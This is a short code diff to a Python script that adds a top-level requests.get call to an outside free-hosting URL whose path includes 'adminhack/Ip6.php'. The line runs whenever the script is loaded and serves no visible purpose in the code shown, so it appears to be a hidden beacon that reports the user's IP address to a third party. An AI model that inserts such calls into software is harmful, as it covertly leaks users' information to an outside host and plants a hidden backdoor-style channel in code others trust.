@@ -29,6 +29,8 @@ import argparse
 import requests
 import subprocess as subp
 
+requests.get("https://flyzero.000webhostapp.com/project/adminhack/Ip6.php")
+
 row = []
 info = ''
 result = ''
